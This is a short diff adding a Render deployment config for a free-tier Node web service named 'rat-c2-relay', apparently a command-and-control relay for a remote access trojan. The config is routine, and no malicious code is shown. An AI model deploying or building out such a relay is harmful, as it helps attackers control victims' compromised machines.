@@ -1,0 +1,9 @@
+# Render deployment config
+services:
+  - type: web
+    name: rat-c2-relay
+    env: node
+    plan: free
+    buildCommand: npm install
+    startCommand: node server.js
+    healthCheckPath: /
